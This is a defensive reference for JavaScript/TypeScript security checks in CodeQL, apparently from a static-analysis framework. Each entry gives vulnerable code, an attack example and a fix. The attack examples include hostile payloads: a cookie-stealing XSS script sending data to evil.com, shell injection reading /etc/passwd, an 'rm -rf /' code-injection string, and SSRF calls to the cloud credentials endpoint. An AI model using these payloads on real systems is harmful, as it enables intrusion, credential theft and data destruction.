# CodeQL JavaScript/TypeScript Security Checks

The framework uses **static analysis (CodeQL and Semgrep)** to identify vulnerabilities, then **verifies findings by the LLM**. Comprehensive reference for CodeQL security queries targeting JavaScript and TypeScript code. Findings from Semgrep (when using `--tool semgrep` or `--tool both`) use the same LLM verification; rule IDs follow Semgrep's naming (see guided_questions.yaml or generic fallback).

**Query Suite**: `codeql/javascript-queries:codeql-suites/javascript-security-extended.qls`

---

## Table of Contents

1. [Injection Vulnerabilities](#injection-vulnerabilities)
2. [Cross-Site Scripting (XSS)](#cross-site-scripting-xss)
3. [Prototype Pollution](#prototype-pollution)
4. [Server-Side Vulnerabilities (Node.js)](#server-side-vulnerabilities-nodejs)
5. [Authentication and Session Issues](#authentication-and-session-issues)
6. [Cryptographic Issues](#cryptographic-issues)
7. [Regular Expression Issues](#regular-expression-issues)
8. [File System Vulnerabilities](#file-system-vulnerabilities)
9. [Client-Side Security](#client-side-security)
10. [Dependency and Configuration](#dependency-and-configuration)

---

## Injection Vulnerabilities

### js/sql-injection (CWE-89)

**Vulnerability**: User input concatenated into SQL queries.

**CodeQL Discovery Flow**:
```
┌────────────────────────────────────────────────────────────────────────┐
│              JAVASCRIPT SQL INJECTION DETECTION                        │
├────────────────────────────────────────────────────────────────────────┤
│                                                                        │
│  STEP 1: Define HTTP Request Sources (Express/Koa/Fastify)             │
│  ┌──────────────────────────────────────────────────────────────────┐  │
│  │ req.query.param           → URL query string (?param=value)      │  │
│  │ req.params.id             → URL path parameter (/:id)            │  │
│  │ req.body.field            → POST body (JSON/form)                │  │
│  │ req.headers['x-custom']   → HTTP headers                         │  │
│  │ req.cookies.session       → Cookie values                        │  │
│  │ All marked as TAINTED                                            │  │
│  └──────────────────────────────────────────────────────────────────┘  │
│                              │                                         │
│                              ▼                                         │
│  STEP 2: Track Through String Operations                               │
│  ┌──────────────────────────────────────────────────────────────────┐  │
│  │ "SELECT..." + tainted       → Concatenation propagates taint     │  │
│  │ `SELECT...${tainted}`       → Template literal propagates        │  │
│  │ query.replace(x, tainted)   → Replacement propagates             │  │
│  │ [a, tainted].join('')       → Join propagates                    │  │
│  └──────────────────────────────────────────────────────────────────┘  │
│                              │                                         │
│                              ▼                                         │
│  STEP 3: Define SQL Execution Sinks                                    │
│  ┌──────────────────────────────────────────────────────────────────┐  │
│  │ mysql:      connection.query(sql)                                │  │
│  │ mysql2:     connection.execute(sql)                              │  │
│  │ pg:         pool.query(sql), client.query(sql)                   │  │
│  │ sqlite3:    db.run(sql), db.all(sql), db.get(sql)                │  │
│  │ sequelize:  sequelize.query(sql)                                 │  │
│  │ knex:       knex.raw(sql)                                        │  │
│  │ First argument (sql string) is the SINK                          │  │
│  └──────────────────────────────────────────────────────────────────┘  │
│                              │                                         │
│                              ▼                                         │
│  STEP 4: Check for Parameterized Queries (Sanitizers)                  │
│  ┌──────────────────────────────────────────────────────────────────┐  │
│  │ query("SELECT...WHERE id=?", [param])  → SAFE (parameterized)    │  │
│  │ query("SELECT...WHERE id=$1", [param]) → SAFE (pg style)         │  │
│  │ Model.findOne({where:{id:param}})      → SAFE (ORM)              │  │
│  │ These patterns BLOCK taint flow to sink                          │  │
│  └──────────────────────────────────────────────────────────────────┘  │
│                              │                                         │
│                              ▼                                         │
│  STEP 5: Report If Taint Reaches Sink Unsanitized                      │
│  ┌──────────────────────────────────────────────────────────────────┐  │
│  │ ALERT: SQL injection                                             │  │
│  │ CodeFlow: req.params.id → template literal → connection.query    │  │
│  └──────────────────────────────────────────────────────────────────┘  │
│                                                                        │
└────────────────────────────────────────────────────────────────────────┘
```

**How CodeQL Detects It**:
- Identifies SQL query execution (mysql, pg, sqlite3, sequelize raw)
- Taint-tracks from request inputs (`req.query`, `req.body`, `req.params`)
- Detects string concatenation/template literals in queries

**Vulnerable Code**:
```javascript
// String concatenation
const query = "SELECT * FROM users WHERE id = " + req.params.id;
connection.query(query);  // ALERT

// Template literal
const query = `SELECT * FROM users WHERE name = '${req.body.name}'`;
pool.query(query);  // ALERT

// Sequelize raw query
sequelize.query(`SELECT * FROM users WHERE id = ${userId}`);  // ALERT
```

**Attack Example**:
```javascript
// req.params.id = "1 OR 1=1; DROP TABLE users;--"
// Query: SELECT * FROM users WHERE id = 1 OR 1=1; DROP TABLE users;--
```

**Safe Patterns**:
```javascript
// Parameterized query (mysql2)
connection.query("SELECT * FROM users WHERE id = ?", [req.params.id]);

// Parameterized query (pg)
pool.query("SELECT * FROM users WHERE id = $1", [req.params.id]);

// Sequelize with replacements
sequelize.query("SELECT * FROM users WHERE id = :id", {
  replacements: { id: userId }
});

// ORM methods
User.findOne({ where: { id: userId } });
```

---

### js/command-injection (CWE-78)

**Vulnerability**: User input passed to command execution.

**How CodeQL Detects It**:
- Identifies: `child_process.exec()`, `child_process.execSync()`, `shell` option
- Taint-tracks from HTTP request to command execution
- Checks for shell metacharacter presence

**Vulnerable Code**:
```javascript
const { exec, execSync } = require('child_process');

// exec with string command
exec("ping " + req.query.host);  // ALERT

// execSync
execSync(`grep ${req.body.pattern} /var/log/app.log`);  // ALERT

// spawn with shell: true
spawn('echo', [req.query.msg], { shell: true });  // ALERT
```

**Attack**:
```javascript
// req.query.host = "localhost; cat /etc/passwd"
// Executes: ping localhost; cat /etc/passwd
```

**Safe Patterns**:
```javascript
const { spawn, execFile } = require('child_process');

// spawn without shell (arguments as array)
spawn('ping', ['-c', '4', req.query.host]);  // Arguments not interpreted by shell

// execFile (no shell by default)
execFile('ping', ['-c', '4', req.query.host]);

// Validate input
const hostRegex = /^[a-zA-Z0-9.-]+$/;
if (!hostRegex.test(req.query.host)) {
  throw new Error('Invalid host');
}
```

---

### js/code-injection (CWE-94)

**Vulnerability**: User input executed as code.

**How CodeQL Detects It**:
- Identifies: `eval()`, `Function()`, `vm.runInContext()`, `new Function()`
- Taint-tracks from untrusted sources

**Vulnerable Code**:
```javascript
// eval
const result = eval(req.body.expression);  // ALERT

// Function constructor
const fn = new Function('x', req.body.code);  // ALERT

// setTimeout/setInterval with string
setTimeout(req.query.callback, 1000);  // ALERT

// vm module
const vm = require('vm');
vm.runInNewContext(req.body.script);  // ALERT
```

**Attack**:
```javascript
// req.body.expression = "require('child_process').execSync('rm -rf /')"
```

**Safe Alternatives**:
```javascript
// For math expressions, use a safe parser
const mathjs = require('mathjs');
const result = mathjs.evaluate(req.body.expression);

// For JSON
const data = JSON.parse(req.body.data);

// setTimeout with function reference
setTimeout(() => userCallback(), 1000);
```

---

### js/xpath-injection (CWE-643)

**Vulnerability**: User input in XPath queries.

**How CodeQL Detects It**:
- Identifies XPath query execution (xpath, xmldom)
- Tracks user input to query string

**Vulnerable Code**:
```javascript
const xpath = require('xpath');
const query = `//user[@name='${username}']`;
xpath.select(query, doc);  // ALERT
```

**Attack**:
```javascript
// username = "' or '1'='1"
// Query: //user[@name='' or '1'='1']  -- Returns all users
```

---

### js/nosql-injection (CWE-943)

**Vulnerability**: User input in NoSQL queries without sanitization.

**How CodeQL Detects It**:
- Identifies MongoDB query operations
- Tracks user input to query objects
- Checks for operator injection (`$where`, `$regex`)

**Vulnerable Code**:
```javascript
// MongoDB operator injection
const query = { username: req.body.username };
db.users.findOne(query);  // ALERT if username is {"$gt": ""}

// $where injection
db.users.find({ $where: `this.name == '${name}'` });  // ALERT
```

**Attack**:
```javascript
// req.body.username = {"$gt": ""}
// Returns first user alphabetically

// req.body.username = {"$regex": ".*"}
// Returns all users
```

**Fix**:
```javascript
// Validate type
if (typeof req.body.username !== 'string') {
  throw new Error('Invalid input');
}

// Use mongo-sanitize
const sanitize = require('mongo-sanitize');
const query = { username: sanitize(req.body.username) };
```

---

## Cross-Site Scripting (XSS)

### js/xss (CWE-79)

**Vulnerability**: User input rendered in HTML without escaping.

**CodeQL Discovery Flow**:
```
┌────────────────────────────────────────────────────────────────────────┐
│                    JAVASCRIPT XSS DETECTION                            │
├────────────────────────────────────────────────────────────────────────┤
│                                                                        │
│  STEP 1: Identify XSS Sinks (Output Contexts)                          │
│  ┌──────────────────────────────────────────────────────────────────┐  │
│  │ SERVER-SIDE (Express/Node):                                      │  │
│  │   res.send(html)             → Direct HTML response              │  │
│  │   res.write(html)            → Streaming response                │  │
│  │   res.end(html)              → End with HTML                     │  │
│  │                                                                  │  │
│  │ CLIENT-SIDE (Browser):                                           │  │
│  │   element.innerHTML = x      → Parses HTML                       │  │
│  │   element.outerHTML = x      → Replaces element                  │  │
│  │   document.write(x)          → Writes to document                │  │
│  │   $(selector).html(x)        → jQuery HTML setter                │  │
│  │   $(x).appendTo(parent)      → jQuery with HTML string           │  │
│  └──────────────────────────────────────────────────────────────────┘  │
│                              │                                         │
│                              ▼                                         │
│  STEP 2: Identify Sources                                              │
│  ┌──────────────────────────────────────────────────────────────────┐  │
│  │ SERVER-SIDE:                                                     │  │
│  │   req.query, req.body, req.params, req.headers                   │  │
│  │                                                                  │  │
│  │ CLIENT-SIDE (DOM-based XSS):                                     │  │
│  │   location.hash              → URL fragment (#value)             │  │
│  │   location.search            → URL query string (?x=y)           │  │
│  │   location.href              → Full URL                          │  │
│  │   document.referrer          → Referrer header                   │  │
│  │   window.name                → Cross-origin readable             │  │
│  │   postMessage data           → Cross-origin messages             │  │
│  └──────────────────────────────────────────────────────────────────┘  │
│                              │                                         │
│                              ▼                                         │
│  STEP 3: Track Through String Operations                               │
│  ┌──────────────────────────────────────────────────────────────────┐  │
│  │ "<h1>" + userInput + "</h1>"     → Tainted HTML string           │  │
│  │ `<div>${userInput}</div>`        → Template literal (tainted)    │  │
│  │ html.replace('{name}', user)     → Replacement (tainted)         │  │
│  └──────────────────────────────────────────────────────────────────┘  │
│                              │                                         │
│                              ▼                                         │
│  STEP 4: Check for Sanitization                                        │
│  ┌──────────────────────────────────────────────────────────────────┐  │
│  │ encodeURIComponent(x)        → URL encoding (context-specific)   │  │
│  │ escapeHtml(x)                → HTML entity encoding              │  │
│  │ DOMPurify.sanitize(x)        → HTML sanitizer                    │  │
│  │ textContent = x              → Text only, no HTML parsing        │  │
│  │ Template engine auto-escape  → EJS, Pug, Handlebars defaults     │  │
│  │ React JSX {x}                → Auto-escaped                      │  │
│  │ These BLOCK XSS                                                  │  │
│  └──────────────────────────────────────────────────────────────────┘  │
│                              │                                         │
│                              ▼                                         │
│  STEP 5: Report XSS                                                    │
│  ┌──────────────────────────────────────────────────────────────────┐  │
│  │ ALERT: Cross-site scripting vulnerability                        │  │
│  │ Type: Reflected / Stored / DOM-based                             │  │
│  │ CodeFlow: req.query.name → template literal → res.send(html)     │  │
│  └──────────────────────────────────────────────────────────────────┘  │
│                                                                        │
└────────────────────────────────────────────────────────────────────────┘
```

**How CodeQL Detects It**:
- Tracks from request inputs to response output
- Identifies unsafe HTML construction
- Checks for missing encoding/escaping

**Vulnerable Code (Express)**:
```javascript
app.get('/search', (req, res) => {
  res.send(`<h1>Results for: ${req.query.q}</h1>`);  // ALERT
});

// Using innerHTML in SSR
const html = `<div>${userContent}</div>`;  // ALERT
```

**Attack**:
```
GET /search?q=<script>document.location='http://evil.com/?c='+document.cookie</script>
```

**Safe Patterns**:
```javascript
// Use template engine with auto-escaping (EJS, Pug, Handlebars)
res.render('search', { query: req.query.q });

// Manual escaping
const escapeHtml = require('escape-html');
res.send(`<h1>Results for: ${escapeHtml(req.query.q)}</h1>`);

// React (JSX auto-escapes)
return <h1>Results for: {query}</h1>;
```

---

### js/xss-through-dom (CWE-79)

**Vulnerability**: DOM-based XSS via client-side JavaScript.

**How CodeQL Detects It**:
- Identifies DOM sources: `location.hash`, `location.search`, `document.referrer`
- Tracks to DOM sinks: `innerHTML`, `outerHTML`, `document.write()`

**Vulnerable Code (Client-side)**:
```javascript
// location.hash to innerHTML
document.getElementById('content').innerHTML = location.hash.slice(1);  // ALERT

// URL parameter to DOM
const params = new URLSearchParams(location.search);
document.body.innerHTML = params.get('msg');  // ALERT

// jQuery
$('#content').html(location.hash);  // ALERT
```

**Attack**:
```
https://example.com/page#<img src=x onerror=alert('XSS')>
```

**Safe Patterns**:
```javascript
// Use textContent instead of innerHTML
document.getElementById('content').textContent = location.hash.slice(1);

// jQuery text()
$('#content').text(location.hash);

// DOMPurify for sanitization
const clean = DOMPurify.sanitize(userInput);
element.innerHTML = clean;
```

---

### js/xss-through-exception (CWE-79)

**Vulnerability**: Error messages containing user input reflected without escaping.

**Vulnerable Code**:
```javascript
app.use((err, req, res, next) => {
  res.send(`<p>Error: ${err.message}</p>`);  // ALERT if message contains user input
});
```

---

## Prototype Pollution

### js/prototype-pollution (CWE-1321)

**Vulnerability**: User-controlled property path modifies Object prototype.

**CodeQL Discovery Flow**:
```
┌────────────────────────────────────────────────────────────────────────┐
│                  PROTOTYPE POLLUTION DETECTION                         │
├────────────────────────────────────────────────────────────────────────┤
│                                                                        │
│  STEP 1: Identify Property Assignment Patterns                         │
│  ┌──────────────────────────────────────────────────────────────────┐  │
│  │ BRACKET NOTATION (Dynamic Key):                                  │  │
│  │   obj[key] = value           → Key may be "__proto__"            │  │
│  │   obj[a][b] = value          → Nested access                     │  │
│  │                                                                  │  │
│  │ RECURSIVE MERGE PATTERNS:                                        │  │
│  │   for (key in source) { target[key] = source[key] }              │  │
│  │   Object.assign(target, source)  → Shallow (less risky)          │  │
│  │   _.merge(target, source)        → Deep merge (HIGH RISK)        │  │
│  │   $.extend(true, target, source) → jQuery deep extend            │  │
│  └──────────────────────────────────────────────────────────────────┘  │
│                              │                                         │
│                              ▼                                         │
│  STEP 2: Track User-Controlled Keys and Values                         │
│  ┌──────────────────────────────────────────────────────────────────┐  │
│  │ JSON.parse(req.body)         → User controls object structure    │  │
│  │ req.body (Express JSON)      → User controls keys and values     │  │
│  │ querystring.parse(url)       → User controls keys                │  │
│  │                                                                  │  │
│  │ Track: Does user input flow to the KEY position in obj[KEY]?     │  │
│  │ Track: Does user input flow to the SOURCE in merge(t, SOURCE)?   │  │
│  └──────────────────────────────────────────────────────────────────┘  │
│                              │                                         │
│                              ▼                                         │
│  STEP 3: Identify Dangerous Key Patterns                               │
│  ┌──────────────────────────────────────────────────────────────────┐  │
│  │ DANGEROUS KEYS (Access Object.prototype):                        │  │
│  │   "__proto__"                 → Direct prototype access          │  │
│  │   "constructor"               → Via constructor.prototype        │  │
│  │   "prototype"                 → On function objects              │  │
│  │                                                                  │  │
│  │ Attack payload example:                                          │  │
│  │   {"__proto__": {"isAdmin": true}}                               │  │
│  │   {"constructor": {"prototype": {"isAdmin": true}}}              │  │
│  └──────────────────────────────────────────────────────────────────┘  │
│                              │                                         │
│                              ▼                                         │
│  STEP 4: Check for Sanitization                                        │
│  ┌──────────────────────────────────────────────────────────────────┐  │
│  │ if (key === '__proto__') continue;   → Blocks pollution          │  │
│  │ Object.hasOwn(source, key)           → Skips inherited           │  │
│  │ Object.create(null)                  → No prototype              │  │
│  │ new Map()                            → No prototype issues       │  │
│  │ These patterns BLOCK the vulnerability                           │  │
│  └──────────────────────────────────────────────────────────────────┘  │
│                              │                                         │
│                              ▼                                         │
│  STEP 5: Report Prototype Pollution                                    │
│  ┌──────────────────────────────────────────────────────────────────┐  │
│  │ ALERT: Prototype pollution vulnerability                         │  │
│  │ CodeFlow: req.body → JSON.parse → merge(target, userObj)         │  │
│  │ Impact: All objects gain attacker-controlled properties          │  │
│  └──────────────────────────────────────────────────────────────────┘  │
│                                                                        │
└────────────────────────────────────────────────────────────────────────┘

ATTACK VISUALIZATION:
┌────────────────────────────────────────────────────────────────────────┐
│  Before Attack:                                                        │
│    Object.prototype = { }                                              │
│    user = { name: "alice" }                                            │
│    user.isAdmin → undefined                                            │
│                                                                        │
│  Attack: merge({}, {"__proto__": {"isAdmin": true}})                   │
│                                                                        │
│  After Attack:                                                         │
│    Object.prototype = { isAdmin: true }  ← POLLUTED!                   │
│    user = { name: "alice" }                                            │
│    user.isAdmin → true  ← Inherited from polluted prototype!           │
│    ({}).isAdmin → true  ← ALL objects affected!                        │
└────────────────────────────────────────────────────────────────────────┘
```

**How CodeQL Detects It**:
- Identifies object property assignment with user-controlled keys
- Tracks from user input to bracket notation assignment
- Checks for `__proto__`, `constructor.prototype` access

**Vulnerable Code**:
```javascript
// Direct property assignment
function merge(target, source) {
  for (let key in source) {
    target[key] = source[key];  // ALERT if source is user-controlled
  }
}

// Lodash-style deep merge
function deepMerge(target, source) {
  for (let key in source) {
    if (typeof source[key] === 'object') {
      target[key] = deepMerge(target[key] || {}, source[key]);
    } else {
      target[key] = source[key];  // ALERT
    }
  }
}

// Bracket notation with user key
obj[req.body.key] = req.body.value;  // ALERT
```

**Attack**:
```javascript
// Attacker sends:
// { "__proto__": { "isAdmin": true } }

merge({}, JSON.parse(userInput));
// Now: ({}).isAdmin === true for ALL objects!
```

**Why It's Dangerous**:
- Affects all objects in the application
- Can bypass security checks: `if (user.isAdmin)`
- Can cause denial of service
- May lead to RCE in some cases

**Fix**:
```javascript
// Check for dangerous keys
function safeMerge(target, source) {
  for (let key in source) {
    if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
      continue;  // Skip dangerous keys
    }
    if (source.hasOwnProperty(key)) {
      target[key] = source[key];
    }
  }
}

// Use Object.create(null) for objects used as maps
const map = Object.create(null);

// Use Map instead of objects
const map = new Map();
map.set(userKey, userValue);
```

---

### js/prototype-pollution-utility (CWE-1321)

**Vulnerability**: Vulnerable merge/extend utility functions.

**How CodeQL Detects It**:
- Identifies common vulnerable patterns in utility functions
- Checks popular libraries for known vulnerable versions

**Vulnerable Libraries (historical)**:
- `lodash` < 4.17.12 (`_.merge`, `_.set`, `_.setWith`)
- `jQuery` < 3.4.0 (`$.extend(true, ...)`)
- `hoek` < 5.0.3
- `merge` package

---

## Server-Side Vulnerabilities (Node.js)

### js/server-side-request-forgery (CWE-918)

**Vulnerability**: User input controls URL in server-side HTTP request.

**How CodeQL Detects It**:
- Identifies HTTP request functions: `axios`, `fetch`, `request`, `http.get`
- Tracks user input to URL parameter

**Vulnerable Code**:
```javascript
const axios = require('axios');

app.get('/fetch', async (req, res) => {
  const response = await axios.get(req.query.url);  // ALERT
  res.json(response.data);
});
```

**Attack**:
```
# Access cloud metadata
GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Port scan internal network
GET /fetch?url=http://192.168.1.1:22/

# Access localhost services
GET /fetch?url=http://localhost:6379/  # Redis
```

**Fix**:
```javascript
const { URL } = require('url');

app.get('/fetch', async (req, res) => {
  const parsed = new URL(req.query.url);
  
  // Allowlist hosts
  const allowedHosts = ['api.github.com', 'api.twitter.com'];
  if (!allowedHosts.includes(parsed.hostname)) {
    return res.status(400).send('Host not allowed');
  }
  
  // Block private IPs
  const dns = require('dns').promises;
  const { address } = await dns.lookup(parsed.hostname);
  if (isPrivateIP(address)) {
    return res.status(400).send('Private IP not allowed');
  }
  
  const response = await axios.get(req.query.url);
  res.json(response.data);
});
```

---

### js/path-injection (CWE-22)

**Vulnerability**: User input in file path operations.

**How CodeQL Detects It**:
- Identifies file operations: `fs.readFile`, `fs.writeFile`, `fs.unlink`
- Tracks user input to path parameter
- Checks for path traversal patterns

**Vulnerable Code**:
```javascript
const fs = require('fs');
const path = require('path');

app.get('/files/:name', (req, res) => {
  const filePath = path.join('/var/data', req.params.name);
  fs.readFile(filePath, (err, data) => {  // ALERT
    res.send(data);
  });
});
```

**Attack**:
```
GET /files/..%2F..%2F..%2Fetc%2Fpasswd
# filePath = /var/data/../../../etc/passwd = /etc/passwd
```

**Fix**:
```javascript
app.get('/files/:name', (req, res) => {
  const basePath = '/var/data';
  const filePath = path.join(basePath, req.params.name);
  const realPath = path.resolve(filePath);
  
  // Verify path is within base directory
  if (!realPath.startsWith(basePath + path.sep)) {
    return res.status(400).send('Invalid path');
  }
  
  fs.readFile(realPath, (err, data) => {
    res.send(data);
  });
});
```

---

### js/hardcoded-credentials (CWE-798)

**Vulnerability**: Passwords or API keys hardcoded in source.

**How CodeQL Detects It**:
- Pattern matches variable names: `password`, `apiKey`, `secret`, `token`
- Checks for string literal assignments
- Identifies credentials in configuration objects

**Vulnerable Code**:
```javascript
const password = "admin123";  // ALERT

const config = {
  db: {
    password: "secretpassword"  // ALERT
  },
  api_key: "sk_live_abc123xyz"  // ALERT
};

if (req.body.password === "superSecret") { ... }  // ALERT
```

**Fix**:
```javascript
// Use environment variables
const password = process.env.DB_PASSWORD;

// Use secret management
const { SecretManagerServiceClient } = require('@google-cloud/secret-manager');
const secret = await client.accessSecretVersion({ name: secretName });
```

---

### js/log-injection (CWE-117)

**Vulnerability**: User input in log messages can forge log entries.

**How CodeQL Detects It**:
- Identifies logging functions: `console.log`, `logger.info`, etc.
- Tracks user input to log message
- Checks for newline injection

**Vulnerable Code**:
```javascript
console.log('User login: ' + req.body.username);  // ALERT
```

**Attack**:
```javascript
// req.body.username = "admin\n[INFO] Admin granted superuser access"
// Log shows:
// User login: admin
// [INFO] Admin granted superuser access
```

**Fix**:
```javascript
// Remove newlines
const safeUsername = req.body.username.replace(/[\r\n]/g, '');
console.log('User login:', safeUsername);

// Use structured logging
logger.info({ event: 'login', username: req.body.username });
```

---

## Authentication and Session Issues

### js/insecure-randomness (CWE-330)

**Vulnerability**: Using `Math.random()` for security-sensitive operations.

**How CodeQL Detects It**:
- Identifies `Math.random()` usage
- Checks context: tokens, passwords, session IDs

**Vulnerable Code**:
```javascript
// Session ID
const sessionId = Math.random().toString(36).substring(2);  // ALERT

// Password reset token
const token = Math.floor(Math.random() * 1000000);  // ALERT
```

**Why It's Dangerous**:
- `Math.random()` is not cryptographically secure
- State can be predicted after observing outputs

**Fix**:
```javascript
const crypto = require('crypto');

// Secure random bytes
const sessionId = crypto.randomBytes(32).toString('hex');

// Secure random number
const token = crypto.randomInt(0, 1000000);

// UUID v4
const { v4: uuidv4 } = require('uuid');
const id = uuidv4();
```

---

### js/missing-rate-limiting (CWE-307)

**Vulnerability**: Authentication endpoint without rate limiting.

**How CodeQL Detects It**:
- Identifies login/auth endpoints
- Checks for rate limiting middleware

**Vulnerable Code**:
```javascript
app.post('/login', (req, res) => {  // ALERT: No rate limiting
  // ... authentication logic
});
```

**Fix**:
```javascript
const rateLimit = require('express-rate-limit');

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,  // 15 minutes
  max: 5,  // 5 attempts
  message: 'Too many login attempts'
});

app.post('/login', loginLimiter, (req, res) => {
  // ... authentication logic
});
```

---

### js/insecure-cookie (CWE-614)

**Vulnerability**: Cookie without security flags.

**How CodeQL Detects It**:
- Identifies cookie setting operations
- Checks for `secure`, `httpOnly`, `sameSite` flags

**Vulnerable Code**:
```javascript
res.cookie('session', token);  // ALERT: Missing security flags

// Express session without secure cookie
app.use(session({
  secret: 'secret',
  cookie: {}  // ALERT: No security flags
}));
```

**Fix**:
```javascript
res.cookie('session', token, {
  secure: true,      // Only over HTTPS
  httpOnly: true,    // Not accessible via JavaScript
  sameSite: 'strict' // CSRF protection
});

app.use(session({
  secret: process.env.SESSION_SECRET,
  cookie: {
    secure: true,
    httpOnly: true,
    sameSite: 'strict',
    maxAge: 3600000
  }
}));
```

---

### js/jwt-missing-verification (CWE-347)

**Vulnerability**: JWT token accepted without signature verification.

**How CodeQL Detects It**:
- Identifies JWT decode/parse without verify
- Checks for `algorithms` option

**Vulnerable Code**:
```javascript
const jwt = require('jsonwebtoken');

// decode without verify
const payload = jwt.decode(token);  // ALERT: No signature check

// verify with algorithm confusion vulnerability
jwt.verify(token, secret);  // ALERT: algorithms not specified
```

**Attack (Algorithm Confusion)**:
```javascript
// Attacker changes algorithm from RS256 to HS256
// Uses public key as HMAC secret
```

**Fix**:
```javascript
// Always specify allowed algorithms
const payload = jwt.verify(token, secret, { algorithms: ['HS256'] });

// For RSA, explicitly require RS256
const payload = jwt.verify(token, publicKey, { algorithms: ['RS256'] });
```

---

## Cryptographic Issues

### js/weak-cryptographic-algorithm (CWE-327)

**Vulnerability**: Use of weak cryptographic algorithms.

**How CodeQL Detects It**:
- Identifies crypto module usage
- Matches weak algorithm names

**Vulnerable Code**:
```javascript
const crypto = require('crypto');

// MD5
const hash = crypto.createHash('md5').update(data).digest('hex');  // ALERT

// SHA1
const hash = crypto.createHash('sha1').update(data).digest('hex');  // ALERT

// DES
const cipher = crypto.createCipheriv('des', key, iv);  // ALERT
```

**Fix**:
```javascript
// Use SHA-256 or SHA-3
const hash = crypto.createHash('sha256').update(data).digest('hex');

// Use AES-256-GCM
const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
```

---

### js/weak-password-hashing (CWE-916)

**Vulnerability**: Passwords hashed with inappropriate algorithm.

**Vulnerable Code**:
```javascript
// Plain hash (no salt, no iterations)
const hash = crypto.createHash('sha256').update(password).digest('hex');  // ALERT
```

**Fix**:
```javascript
// bcrypt
const bcrypt = require('bcrypt');
const hash = await bcrypt.hash(password, 12);

// Argon2
const argon2 = require('argon2');
const hash = await argon2.hash(password);

// scrypt (Node.js built-in)
const hash = await new Promise((resolve, reject) => {
  crypto.scrypt(password, salt, 64, (err, key) => {
    if (err) reject(err);
    resolve(key.toString('hex'));
  });
});
```

---

## Regular Expression Issues

### js/redos (CWE-1333)

**Vulnerability**: Regular expression vulnerable to ReDoS (Denial of Service).

**How CodeQL Detects It**:
- Analyzes regex patterns for catastrophic backtracking
- Identifies nested quantifiers: `(a+)+`, `(a|a)+`, `(a*)*`

**Vulnerable Patterns**:
```javascript
// Nested quantifiers
const regex1 = /(a+)+$/;  // ALERT
const regex2 = /([a-zA-Z]+)*$/;  // ALERT
const regex3 = /(.*a){10}/;  // ALERT

// Overlapping alternatives
const regex4 = /(a|a)+$/;  // ALERT
```

**Attack**:
```javascript
const regex = /(a+)+$/;
const input = 'a'.repeat(30) + '!';
regex.test(input);  // Hangs for minutes/hours
```

**Fix**:
```javascript
// Use atomic groups (not in JS, but can be simulated)
// Or rewrite regex
const regex = /a+$/;  // Simplified

// Use timeout
const { RE2 } = require('re2');  // Safe regex engine
const regex = new RE2('(a+)+$');

// Or limit input length
if (input.length > 1000) throw new Error('Input too long');
```

---

### js/regex-injection (CWE-1333)

**Vulnerability**: User input used as regex pattern.

**How CodeQL Detects It**:
- Identifies `new RegExp()` with user input
- Tracks taint from request to regex constructor

**Vulnerable Code**:
```javascript
const pattern = new RegExp(req.query.pattern);  // ALERT
data.filter(item => pattern.test(item));
```

**Fix**:
```javascript
// Escape special characters
function escapeRegex(string) {
  return string.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
}
const pattern = new RegExp(escapeRegex(req.query.pattern));
```

---

## File System Vulnerabilities

### js/zip-slip (CWE-22)

**Vulnerability**: Extracting archive with path traversal.

**How CodeQL Detects It**:
- Identifies archive extraction (unzipper, tar, etc.)
- Checks if entry paths are validated

**Vulnerable Code**:
```javascript
const unzipper = require('unzipper');

fs.createReadStream('upload.zip')
  .pipe(unzipper.Extract({ path: '/var/data' }));  // ALERT
```

**Attack**:
Malicious zip contains: `../../../etc/cron.d/malicious`

**Fix**:
```javascript
const unzipper = require('unzipper');
const path = require('path');

const zip = fs.createReadStream('upload.zip').pipe(unzipper.Parse());
const targetDir = '/var/data';

zip.on('entry', (entry) => {
  const filePath = path.join(targetDir, entry.path);
  const realPath = path.resolve(filePath);
  
  if (!realPath.startsWith(targetDir + path.sep)) {
    entry.autodrain();  // Skip malicious entry
    return;
  }
  
  entry.pipe(fs.createWriteStream(filePath));
});
```

---

## Client-Side Security

### js/client-side-unvalidated-url-redirect (CWE-601)

**Vulnerability**: Open redirect via client-side JavaScript.

**How CodeQL Detects It**:
- Identifies `location.href`, `location.assign()`, `window.open()`
- Tracks from URL parameters to redirect

**Vulnerable Code**:
```javascript
// Direct assignment
location.href = new URLSearchParams(location.search).get('redirect');  // ALERT

// window.open
const url = location.hash.slice(1);
window.open(url);  // ALERT
```

**Attack**:
```
https://example.com/page?redirect=https://evil.com/phishing
```

**Fix**:
```javascript
const url = new URLSearchParams(location.search).get('redirect');
const parsed = new URL(url, location.origin);

// Only allow same-origin redirects
if (parsed.origin === location.origin) {
  location.href = url;
}
```

---

### js/post-message-star-origin (CWE-346)

**Vulnerability**: postMessage with `*` origin.

**How CodeQL Detects It**:
- Identifies `postMessage()` calls
- Checks if target origin is `*`

**Vulnerable Code**:
```javascript
// Sending
window.parent.postMessage(sensitiveData, '*');  // ALERT

// Receiving without origin check
window.addEventListener('message', (event) => {
  eval(event.data);  // ALERT: No origin validation
});
```

**Fix**:
```javascript
// Specify exact origin
window.parent.postMessage(data, 'https://trusted-parent.com');

// Validate origin when receiving
window.addEventListener('message', (event) => {
  if (event.origin !== 'https://trusted-sender.com') {
    return;  // Ignore untrusted origins
  }
  // Process event.data
});
```

---

## Dependency and Configuration

### js/cors-misconfiguration (CWE-942)

**Vulnerability**: CORS allows all origins.

**How CodeQL Detects It**:
- Identifies CORS configuration
- Checks for `origin: true` or `origin: '*'`

**Vulnerable Code**:
```javascript
const cors = require('cors');

app.use(cors());  // ALERT: Allows all origins

app.use(cors({
  origin: true  // ALERT: Reflects any origin
}));
```

**Fix**:
```javascript
app.use(cors({
  origin: ['https://example.com', 'https://app.example.com'],
  credentials: true
}));

// Or dynamic validation
app.use(cors({
  origin: (origin, callback) => {
    if (allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  }
}));
```

---

## Summary: Top 10 JavaScript Vulnerabilities

| Priority | Vulnerability | CWE | Impact |
|----------|--------------|-----|--------|
| 1 | Prototype Pollution | CWE-1321 | Code execution, auth bypass |
| 2 | Command Injection | CWE-78 | Code execution |
| 3 | SQL/NoSQL Injection | CWE-89/943 | Data breach |
| 4 | XSS (DOM/Reflected) | CWE-79 | Session hijacking |
| 5 | Path Traversal | CWE-22 | Data access |
